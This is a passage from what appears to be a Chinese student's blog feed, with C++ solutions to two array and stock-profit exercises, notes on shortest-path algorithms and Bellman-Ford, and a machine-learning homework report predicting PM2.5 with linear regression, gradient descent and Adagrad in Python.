<h4 id="19-合并两个有序数组"><a href="#19-合并两个有序数组" class="headerlink" title="19.合并两个有序数组"></a>19.合并两个有序数组</h4><p>这个是合并两个有序的数组，这两个非递减排列的数组我们要进行合并，其中nums1留出了合并以后的位置，能够将nums2的数据合并进来，但是问题是我首先想到的使用插入排序，这个方法显然时间复杂度就是$n^2$的量级了，因为既要遍历一个数组，又要在另一个数组里插入元素，这显然是复杂度很高的算法.因为这两个数组是有序的，因此我们可以使用两个指针分别遍历这两个数组中的元素，但是数组移动的时间复杂度是高的。可以使用merge的方法，但是这样貌似就多使用了一份数组的空间复杂度。。。还有没有能够在nums1上原地修改的方法呢</p>
<p>。。。。。</p>
<p>看了一眼答案，比较简单，因为nums1的后面留出了一些0，可以比较最大值放入，这样前面覆盖时后面的一定进入了后面的0位置。等于的情况直接归到第二种了，是不是稳定的还得另说</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">merge</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums1, <span class="type">int</span> m, vector&lt;<span class="type">int</span>&gt;&amp; nums2, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//开始</span></span><br><span class="line">    <span class="type">int</span> index1 = m<span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> index2 = n<span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> tail = m+n<span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> cur;</span><br><span class="line">    <span class="keyword">while</span>(index1&gt;=<span class="number">0</span>||index2&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(index1&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            cur = nums2[index2--];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(index2&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            cur = nums1[index1--];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(nums1[index1]&gt;nums2[index2])&#123;</span><br><span class="line">            cur = nums1[index1--];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(nums1[index1]&lt;=nums2[index2])&#123;</span><br><span class="line">            cur = nums2[index2--];</span><br><span class="line">        &#125;</span><br><span class="line">        nums1[tail--] = cur;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="20-买卖股票的最佳时机"><a href="#20-买卖股票的最佳时机" class="headerlink" title="20.买卖股票的最佳时机"></a>20.买卖股票的最佳时机</h4><p>贪心题，用贪心算法解决.因为毕竟股票也就买卖一次就好，也就是我们可以取左边的最小值，然后取右边的最大值就好</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ans=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> low = <span class="number">1e6</span>;</span><br><span class="line">        <span class="type">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            low = <span class="built_in">min</span>(low,prices[i]);<span class="comment">//取左边的最小值</span></span><br><span class="line">            ans = <span class="built_in">max</span>(ans,prices[i]-low);<span class="comment">//看看是不是有最大值</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>MIT_algorithm 1</title>
    <url>/2022/12/16/MIT-algorithm/</url>
    <content><![CDATA[<p>shortest Path :minimum weight path from s to t</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221216230616611.png" alt="image-20221216230616611"></p>
<p>一个问题是：如果我们可以多次重复经过一条边，那么如上图，我们可以在一个minus cycle里不断让path进行减少，无穷无尽。。</p>
<p>我们可以使用BFS来solve unweighted graph，当然我们也可以推广这一点，当边的weight值不算太大时，我们可以通过将边的权值看作是权值为1的边的串联。当权重很大时，这个就不是一个很好的方法了。</p>
<p>Shortest path tree</p>
<p>初始化父指针的数据结构为None</p>
<p>初始化每个顶点的$\delta$ </p>
<p>DAG有向无环图，不用担心处理负环的问题</p>
<p>DAG relaxation ：</p>
<p>d(s,v)距离估计，$\delta$是最短的距离</p>
<p>开始将d设为无穷，逐步进行减小</p>
<p>问题：什么时候进行减小</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221216234434248.png" alt="image-20221216234434248"></p>
<p>Triangle Inequality：u到v的距离不能大于通过限制x的距离。</p>
<p>  基本思想：放松这个限制条件，让两侧逐渐相等。   </p>
<p>将所有d(s,v)的distance设置,将d(s,s)设置为0</p>
<p>按照拓扑结构处理每一个顶点u，DAG有一个拓扑结构</p>
<p>For each $v \in Agj^+(u)$</p>
<p>if$d(s,v)&gt;d(s,u)+w(u,v)$ ,relax (u,v) ,set d(s,v) = d(s,u)+w(u,w )</p>
<p>Ex 1：Given undirected graph G,return whether G contains a negative weight cycle.</p>
<p>在无向图中有一个问题，能够不断的穿越一条负权重的edge使权重减少，因此我们的讨论在有向图中进行。</p>
<p>Ex 2： Alg A solves the single source shortest path problem in O(|v|(|v|+|E|))</p>
<p>show how to solve the SSSP in O(|V||E|)</p>
<p> Simple Shortest Paths</p>
<p>Claim 1:If $\delta(s,v)$ is finite,$\exists$ a shortest path that is simple</p>
<p>proof:如果我们的shortest path上有一个cycle，那么这个cycle的权值一定不是负数，因为如果是一个负数，那么可以一直进行循环使权重进行减少。那么这个cycle的权重一定是正数或者0，那么就可以去掉这个环使weight更少。</p>
<p>simple path最多有v-1条边</p>
<p>k-Edge distance $\delta_k(a,v)$ s到v的最短距离，最多使用k条边</p>
<p> IF $\delta_{|v|}(s,v)&lt;\delta_{|v|-1}(s,v)$</p>
<p>前一项的路径不可能是simple的，因为它一定重复经过顶点，如果上式成立，那么s到v的实际最短距离一定是负无穷大。</p>
<p>Bellman-Ford</p>
<p>idea:graph Duplication</p>
<p>Make |v|+1 levels,$V_k$in level k reprents reaching vetex v using at most k </p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221217200712791.png" alt="image-20221217200712791"></p>
<p>可以将图进行一种副本一样的复制，将左边的图复制到右遍图的状态，这样就可以使用一种k edges的状态来表示。例如在k=0时，我们不能从a0到达任何一个其它的顶点。当从level移动到另一层level时，这样就会出现增加upbound的情况。</p>
<p>Bellman-Ford </p>
<ul>
<li><p>Construct G’ vertices |V|(|V|+1) edgese |V|(|V|+|E|) It’s a DAG,and can be done in linear times.</p>
<p>Explain：that same vertex has an edge connect each other</p>
</li>
<li><p>Run DAG Relaxation from  $S_0$,compute $\delta (S_0,v_k),k=0,….,|V|$</p>
</li>
<li><p>For each vetex V: set d(s,v)=$\delta(s_0,v_{|v|-1})$ </p>
</li>
<li><p>For each witness $u\in　V　(\delta(s_0,u_{|V|}&lt;\delta(s_0,u_{|V-1|}))$ For each V reachable from u,set the distance infinite.</p>
</li>
</ul>
]]></content>
      <categories>
        <category>algorithm</category>
      </categories>
      <tags>
        <tag>algorithm</tag>
        <tag>Dynamic Programming</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2022/12/10/ML%20Homework1/</url>
    <content><![CDATA[<h1 id="ML-Homework1"><a href="#ML-Homework1" class="headerlink" title="ML Homework1"></a>ML Homework1</h1><blockquote>
<p>姓名：<strong>李卓群</strong></p>
<p>学号：<strong>202000460041</strong></p>
</blockquote>
<p>[TOC]</p>
<h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><p>​    用 linear regression 预测出空气污染指数(即PM2.5) 的数值，采用多种方式对模型进行优化，提升模型的准确度。</p>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>​    <strong>Host:</strong>win11;kaggle;python3.9</p>
<h2 id="实验方法"><a href="#实验方法" class="headerlink" title="实验方法"></a>实验方法</h2><h3 id="1-Module1"><a href="#1-Module1" class="headerlink" title="1.Module1"></a>1.Module1</h3><p>​        首先准备先从一个比较简单的模型进行入手，这里我们只考虑PM2.5一种参数，并使用传统的梯度下降方式进行求解。</p>
<h4 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h4><p>​        这里我们使用kaggle进行代码编写，首先创建了一个dataset，然后从dataset中读取csv文件作为数据内容，然后我们打印前18行，也就是一天的数据集合。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>]=[<span class="string">&#x27;SimHei&#x27;</span>] <span class="comment">#用来正常显示中文标签</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;axes.unicode_minus&#x27;</span>]=<span class="literal">False</span> <span class="comment">#用来正常显示</span></span><br><span class="line"></span><br><span class="line">path = <span class="string">&#x27;../input/train111/train.csv&#x27;</span></span><br><span class="line">data = pd.read_csv(path)</span><br><span class="line">data.head(<span class="number">18</span>)</span><br><span class="line"><span class="comment">#使用data.describe()对数据进行统计性的描述</span></span><br><span class="line">data.describe()</span><br></pre></td></tr></table></figure>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20221016162939156.png" alt="image-20221016162939156"></p>
<p>​    可以看到一共有4320条数据，每天18条，也就是一共240天，feature是18。</p>
<p>下面进行训练</p>
<p>1.将一天分为15组，前9个小时对第10个小时的浓度进行预测。</p>
<p>2.首先建立一个x_list，一共有3600 = 15*240组数据。每一组数据中feature=9，也就是PM2.5的9小时数据。</p>
<p>3.y_list就是一位数据，就是PM2.5的实际值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#处理数据，取3-27行</span></span><br><span class="line">data_train = data.iloc[:,<span class="number">3</span>:]</span><br><span class="line">data_train = data_train.replace([<span class="string">&#x27;NR&#x27;</span>],[-<span class="number">1</span>])</span><br><span class="line"><span class="comment">#将RAINFALL中的NR转化为-1</span></span><br><span class="line"><span class="comment">#将表中数据转换为二维数组格式，数据类型为浮点型</span></span><br><span class="line">data2 = np.array(data_train).astype(<span class="built_in">float</span>)</span><br><span class="line"><span class="built_in">print</span>(data2)</span><br><span class="line"><span class="built_in">print</span>(data2.shape[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(data2.shape[<span class="number">1</span>])</span><br><span class="line">x_list = []</span><br><span class="line">y_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4320</span>,<span class="number">18</span>):</span><br><span class="line">    <span class="comment">#遍历每一天的所有数据</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        <span class="comment">#取前15组训练集的开始</span></span><br><span class="line">        x_slide = data2[i:i+<span class="number">18</span>,j:j+<span class="number">9</span>]</span><br><span class="line">        y_slide = data2[i+<span class="number">9</span>,j+<span class="number">9</span>]</span><br><span class="line">        <span class="comment">#y是9小时以后的PM2.5的值</span></span><br><span class="line">        x_list.append(x_slide)</span><br><span class="line">        y_list.append(y_slide)</span><br><span class="line">X = np.array(x_list)</span><br><span class="line">y = np.array(y_list)</span><br><span class="line"><span class="comment">#将x_list和y_list转化为np数组类型</span></span><br><span class="line"><span class="built_in">print</span>(X.shape)</span><br><span class="line"><span class="built_in">print</span>(y.shape)</span><br><span class="line"><span class="comment">#(3600, 18, 9)</span></span><br><span class="line"><span class="comment">#(3600,)</span></span><br></pre></td></tr></table></figure>
<h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><p>​        这里我们对模型进行一定的优化</p>
<h5 id="1-Regularized-Linear-Regreeion"><a href="#1-Regularized-Linear-Regreeion" class="headerlink" title="1.Regularized Linear Regreeion"></a>1.Regularized Linear Regreeion</h5><p>​        可以引入正则化系数对模型进行优化，能够方式过拟合现象的发生，但是我们训练模型时发现加入正则化系数对损失函数结果影响比较小，由于我们采用线性模型的情况下，feature的指数都是1，不太会出现过拟合现象，因此引入正则化系数意义并不大。</p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20221016171611519.png" alt="image-20221016171611519" style="zoom:67%;" /></p>
<h5 id="2-Cross-Vaildation"><a href="#2-Cross-Vaildation" class="headerlink" title="2.Cross-Vaildation"></a>2.Cross-Vaildation</h5><p>​        通过交叉验证的方式对模型进行训练，在模型中选取一部分数据作为验证集进行处理，通过训练集进行模型的训练，并用验证集计算LOSS损失函数，选择最小的损失率进行全数据的训练。在module1里面，一共存在3600条数据，这里我们选择前3000项数据作为训练集合，后600项数据作为验证集合进行验证。</p>
<h5 id="3-Adagradient"><a href="#3-Adagradient" class="headerlink" title="3.Adagradient"></a>3.Adagradient</h5><p>​    采用动态学习率的情况进行训练，用来解决下降率不均匀的情况，首先是一个较大 的学习率，然后学习率随迭代次数增加逐渐减小。</p>
<p><a href="https://www.cnblogs.com/wry789/p/12988629.html">李宏毅深度学习笔记-Adagrad算法 - yueqiudian - 博客园 (cnblogs.com)</a></p>
<p><img src="https://img2020.cnblogs.com/blog/1242619/202005/1242619-20200529172525755-459858040.png" alt="image-20200529133550548" style="zoom:67%;" /></p>
<p><img src="https://img2020.cnblogs.com/blog/1242619/202005/1242619-20200529172525996-327788208.png" alt="image-20200529133816227" style="zoom:67%;" /></p>
<p>​    $\sigma^t$是之前所有微分均方根，这里能够约掉学习率下降公式中的系数。</p>
<p><img src="https://img2020.cnblogs.com/blog/1242619/202005/1242619-20200529172526464-1528145217.png" alt="image-20200529134059096" style="zoom:67%;" /></p>
<p>解释：最佳微分其实近似是一次微分和二次微分的比值，而所有梯度的均方根可以近似为二次微分。</p>
<h4 id="梯度下降求解"><a href="#梯度下降求解" class="headerlink" title="梯度下降求解"></a>梯度下降求解</h4><p>​    下面进行梯度下降求解，这里前3000项数据我们选做训练集，后600项数据为验证集计算损失函数。</p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20221016170909834.png" alt="image-20221016170909834" style="zoom:67%;" /></p>
<p>​    这里是传统梯度下降算法的实现公式，其中的m表示训练数据集中数据项的个数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">loss</span>(<span class="params">X,y,w,b</span>):</span><br><span class="line">    loss = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">600</span>):</span><br><span class="line">        loss += (y[<span class="number">3000</span>+i]-(b+np.dot(w,X[i+<span class="number">3000</span>,<span class="number">9</span>,:])))**<span class="number">2</span></span><br><span class="line">    loss/=<span class="number">600</span></span><br><span class="line">    <span class="keyword">return</span> loss</span><br><span class="line"><span class="comment">#这里采用多变量的梯度下降方法</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GradientDecent</span>(<span class="params">X,y,w,b</span>):</span><br><span class="line">    reg_rate = <span class="number">0.0001</span> <span class="comment">#正则化系数</span></span><br><span class="line">    <span class="comment">#下面两个比较关键，用来暂时存储w和b，保证w和b是同时进行下降的</span></span><br><span class="line">    grad_b = <span class="number">0</span> </span><br><span class="line">    grad_w = np.zeros(<span class="number">9</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3000</span>):</span><br><span class="line">        grad_b += -<span class="number">2</span>*(y[i]-(b+np.dot(w,X[i,<span class="number">9</span>,:])))</span><br><span class="line">        <span class="comment">#这一步 是更新b的值，将方程求导，然后求内积，这里取的是第i组数组的PM2.5</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">            grad_w[j] += -<span class="number">2</span>*(X[i,<span class="number">9</span>,j])*(y[i]-(b+np.dot(w,X[i,<span class="number">9</span>,:])))</span><br><span class="line">            <span class="comment">#这里是对参数w的更新，这里是对9个小时的方程求导    </span></span><br><span class="line">    <span class="comment">#这里是求导以后的，所以不用加上平方</span></span><br><span class="line">    grad_b/=<span class="number">3000</span></span><br><span class="line">    grad_w/=<span class="number">3000</span></span><br><span class="line">    <span class="comment">#print(grad_w)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#下面我们可以加入Regularization正则化系数进行处理</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        grad_w[k] += (reg_rate*w[k])/<span class="number">3000</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> grad_w,grad_b</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GD_iter</span>(<span class="params">X,y,w,b</span>):</span><br><span class="line">    loss_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(iteration):</span><br><span class="line">        <span class="comment">#get the new w_grad and w_grad</span></span><br><span class="line">        grad_w,grad_b = GradientDecent(X,y,w,b)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#update the b and w</span></span><br><span class="line">        b -= lr*grad_b</span><br><span class="line">        w -= lr*grad_w</span><br><span class="line">        loss_list.append(loss(X,y,w,b))</span><br><span class="line">    <span class="keyword">return</span> w,b,loss_list</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​    训练结果如下图所示，在进行10000次迭代的情况下在验证集上最终平均Loss = 41，损失函数下降情况如下图所示。</p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20221016171928681.png" alt="image-20221016171928681"  /></p>
<p>​    在引入正则化系数的情况下进行10000次迭代</p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20221016172157898.png" alt="image-20221016172157898"></p>
<p>通过Adagradient进行梯度下降</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#采用更加优化的AdaGrad进行梯度下降</span></span><br><span class="line"><span class="comment">#Adagrad是梯度下降的一种改进形式，是包含着学习率下降的方式</span></span><br><span class="line"><span class="comment">#采用一次导数/二次导数的形式，g2之和是二次导数的近似</span></span><br><span class="line"><span class="keyword">def</span>  <span class="title function_">Adagrad</span>(<span class="params">X,y,w,b</span>):</span><br><span class="line">    loss_list = []</span><br><span class="line">    <span class="comment">#损失函数</span></span><br><span class="line">    lr_w = <span class="number">0</span></span><br><span class="line">    lr_b = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(iteration):</span><br><span class="line">        grad_w,grad_b = GradientDecent(X,y,w,b)</span><br><span class="line">        <span class="comment">#这里注意grad_w是一个向量</span></span><br><span class="line">        lr_b =  lr_b+(grad_b**<span class="number">2</span>)</span><br><span class="line">        lr_w = lr_w +(grad_w**<span class="number">2</span>)   </span><br><span class="line">        w = w-(lr/(lr_w**<span class="number">0.5</span>))*grad_w</span><br><span class="line">        <span class="comment">#print(lr/(lr_w**0.5))</span></span><br><span class="line">        b = b-(lr/(lr_b**<span class="number">0.5</span>))*grad_b</span><br><span class="line">        loss_list.append(loss(X,y,w,b))</span><br><span class="line">    <span class="keyword">return</span> w,b,loss_list</span><br></pre></td></tr></table></figure>
<p>可以看到在5000次迭代的情况下，Loss = 38，获得了更好的下降效果。</p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20221016172916467.png" alt="image-20221016172916467"> <a href="train.csv">train.csv</a> </p>
<h4 id="Problem："><a href="#Problem：" class="headerlink" title="Problem："></a>Problem：</h4><p>​    上述模型存在的比较大的问题是时间太长，在5000次下降的情况下都要进行5min以上，不满足3min模型训练的要求，需要进一步在梯度下降算法上进行优化。</p>
<h3 id="2-Module2"><a href="#2-Module2" class="headerlink" title="2.Module2"></a>2.Module2</h3><p>​    module2我们想要考虑更多的parameters,这里对相关变量的相关性进行确定，我们选择相对性相对较高的几个parameters进行数据建模。</p>
<p>​    首先进行数据处理，这里我们把每个参数纵向排列，然后将各个参量列在column中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">train_dict = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> idx, col <span class="keyword">in</span> <span class="built_in">enumerate</span>(data[<span class="string">&#x27;测项&#x27;</span>].unique()):</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">0</span>:</span><br><span class="line">        train_dict[<span class="string">&#x27;date&#x27;</span>] = pd.to_datetime(np.repeat(data[data[<span class="string">&#x27;测项&#x27;</span>] == col][<span class="string">&#x27;日期&#x27;</span>].values, <span class="number">24</span>))</span><br><span class="line">        train_dict[<span class="string">&#x27;hour&#x27;</span>] = pd.to_numeric(np.tile(data[data[<span class="string">&#x27;测项&#x27;</span>] == col].columns[<span class="number">3</span>:],<span class="number">240</span>)) </span><br><span class="line">    <span class="keyword">if</span> col == <span class="string">&#x27;RAINFALL&#x27;</span>:</span><br><span class="line">        tmp_array = data[data[<span class="string">&#x27;测项&#x27;</span>] == col].T.iloc[<span class="number">3</span>:].values.flatten(order=<span class="string">&#x27;F&#x27;</span>)</span><br><span class="line">        tmp_array[tmp_array==<span class="string">&#x27;NR&#x27;</span>] = -<span class="number">1</span></span><br><span class="line">        train_dict[col] = pd.to_numeric(tmp_array)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        train_dict[col] = pd.to_numeric(data[data[<span class="string">&#x27;测项&#x27;</span>] == col].T.iloc[<span class="number">3</span>:].values.flatten(order=<span class="string">&#x27;F&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">train_data = pd.DataFrame(train_dict)</span><br><span class="line">corr = train_data.corr()<span class="comment">#求皮尔森相关系数</span></span><br><span class="line">corr[<span class="string">&#x27;PM2.5&#x27;</span>].sort_values()<span class="comment">#将PM2.5相关系数进行排序</span></span><br></pre></td></tr></table></figure>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20221016192131205.png" alt="image-20221016192131205" style="zoom:67%;" /></p>
<p>​    可以看到和PM2.5相关性系数比较高的几个，这里我们选择相关性前3的参数进行建模(PM2.5,PM10,NO2)。</p>
<h4 id="优化-1"><a href="#优化-1" class="headerlink" title="优化"></a>优化</h4><h5 id="1-优化验证集分布"><a href="#1-优化验证集分布" class="headerlink" title="1.优化验证集分布"></a>1.优化验证集分布</h5><p>​    在上一个module中，我们选择3600个数据的前3000个数据作为训练数据，选择后600个数据作为验证集，但是这样会让验证集过于集中，从而有失一般性。一个更好的方案是将验证集均匀的进行选取，这里我们每10个数据选择一个验证数据添加进数据集，让验证数据在一年之中均匀的进行分布。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">t_x= []</span><br><span class="line">v_x = []</span><br><span class="line">t_y = []</span><br><span class="line">v_y = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3600</span>):</span><br><span class="line">    temp = []</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">        temp = np.append(X[i,<span class="number">5</span>,:],X[i,<span class="number">8</span>:<span class="number">10</span>,:])</span><br><span class="line">        v_x.append(temp)</span><br><span class="line">        v_y.append(y[i])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        temp = np.append(X[i,<span class="number">5</span>,:],X[i,<span class="number">8</span>:<span class="number">10</span>,:])</span><br><span class="line">        t_x.append(temp)</span><br><span class="line">        t_y.append(y[i])</span><br><span class="line">t_x = np.array(t_x)</span><br><span class="line">t_y = np.array(t_y)</span><br><span class="line">v_x = np.array(v_x)</span><br><span class="line">v_y = np.array(v_y)</span><br><span class="line"><span class="built_in">print</span>(t_x.shape)</span><br><span class="line"><span class="built_in">print</span>(t_y.shape)</span><br><span class="line"><span class="built_in">print</span>(v_x.shape)</span><br><span class="line"><span class="built_in">print</span>(v_y.shape)</span><br><span class="line"><span class="comment">#我们间隔抽取一些validation set,每隔10个数均匀选取</span></span><br><span class="line"><span class="comment">#然后剩下的加入train set</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">(3240, 27)</span></span><br><span class="line"><span class="string">(3240,)</span></span><br><span class="line"><span class="string">(360, 27)</span></span><br><span class="line"><span class="string">(360,)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<h5 id="2-Adagradient"><a href="#2-Adagradient" class="headerlink" title="2.Adagradient"></a>2.Adagradient</h5><p>​    经过验证，在3个feature的情况下，依然是采用Adagradient的方式在相同iteration的情况下收敛的更快。因此训练module2我们继续使用Adagradient。</p>
<h5 id="3-矩阵运算加速-important"><a href="#3-矩阵运算加速-important" class="headerlink" title="3.矩阵运算加速(important)"></a>3.矩阵运算加速(important)</h5><p>​    在module1中一个很大的问题是梯度下降过程太慢，每一个paremeter的偏导都需要单独的进行运算，module2我们采用矩阵运算对梯度下降算法进行加速处理，将梯度下降过程统一到矩阵运算中。</p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20221017161744832.png" alt="image-20221017161744832" style="zoom: 50%;" /></p>
<p>​    我们按西瓜书上的描述进行优化运算，将w和b吸收入向量形式w，然后将m个训练数据样本处理成矩阵的形式，将偏导运算转化成矩阵的运算。</p>
<h4 id="梯度下降求解-1"><a href="#梯度下降求解-1" class="headerlink" title="梯度下降求解"></a>梯度下降求解</h4><p>​    我们按照上面的加速优化方式实现Adagradient的梯度下降算法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Adagrad</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Adagradient</span>(<span class="params">t_x,t_y,v_x,v_y,w</span>):</span><br><span class="line">    loss_list = []</span><br><span class="line">    <span class="comment">#损失函数</span></span><br><span class="line">    lr_w = np.zeros(<span class="number">3</span>*<span class="number">9</span>+<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(iteration):</span><br><span class="line">        <span class="comment">#求出偏差的数组</span></span><br><span class="line">        loss_v = np.dot(t_x,w)-t_y</span><br><span class="line">        <span class="comment">#np.dot如果是同一维就是内积运算，不同维度是矩阵运算</span></span><br><span class="line">        <span class="comment">#print(loss_v.shape[0])</span></span><br><span class="line">        <span class="comment">#求出偏导的数组</span></span><br><span class="line">        grad_w  = (<span class="number">2</span>*np.dot(t_x.T,loss_v))/t_x.shape[<span class="number">0</span>]</span><br><span class="line">        lr_w += grad_w**<span class="number">2</span></span><br><span class="line">        sqrt_v = np.sqrt(lr_w)</span><br><span class="line">        <span class="comment">#使用sqrt方法计算</span></span><br><span class="line">        w = w-lr*(grad_w/sqrt_v)</span><br><span class="line">        loss_list.append(loss2(v_x,v_y,w))</span><br><span class="line">    <span class="keyword">return</span> w,loss_list</span><br></pre></td></tr></table></figure>
<p>​    我们选取learning rate = 2,iteration=20000的情况下，训练可以在3min之内完成，但是最终验证集的Loss = 49，并没有达到预期的效果。我猜想是这次样本点的选择更加的均匀但是模型的复杂度不足以支撑导致的。</p>
<p><img src="C:\Users\lc-lzq\AppData\Roaming\Typora\typora-user-images\image-20221017163245588.png" alt="image-20221017163245588"></p>
<h3 id="3-Module3"><a href="#3-Module3" class="headerlink" title="3.Module3"></a>3.Module3</h3><p>​    在module2上进行模型训练并没有很好的达到预期效果，但是在训练时间的优化上大幅度提升。训练时间上的大幅度提升能够让我们选择更多的feature训练更加复杂的module。这次在模型3上我选择了全部18种参数进行训练。</p>
<h4 id="优化-2"><a href="#优化-2" class="headerlink" title="优化"></a>优化</h4><h5 id="1-cross-vaildation数据集更加合理"><a href="#1-cross-vaildation数据集更加合理" class="headerlink" title="1.cross-vaildation数据集更加合理"></a>1.cross-vaildation数据集更加合理</h5><p>​    这次我考虑到PM2.5在时间变化上的连续性，不再采用天作为数据集的分割单位，而是采用月份作为数据集的分割单位，一年一共12个月，每个月20*24=480个小时，前面471个小时都可以作为一个数据样本的起始点。</p>
<p>1.首先按照18个feature进行分割，将各个小时的数据添加到相应feature的后面。</p>
